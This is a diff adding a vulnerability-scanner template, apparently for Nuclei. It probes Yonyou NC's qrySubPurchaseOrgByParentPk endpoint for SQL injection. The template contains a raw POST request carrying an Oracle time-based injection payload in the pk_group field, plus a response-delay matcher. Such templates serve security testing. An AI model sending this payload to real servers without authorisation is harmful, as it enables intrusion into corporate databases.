@@ -1,0 +1,35 @@
+id: yonyou-nc-qrySubPurchaseOrgByParentPk-sqli
+info:
+  name: 用友NC qrySubPurchaseOrgByParentPk 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BNC%20qrySubPurchaseOrgByParentPk%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,nc
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
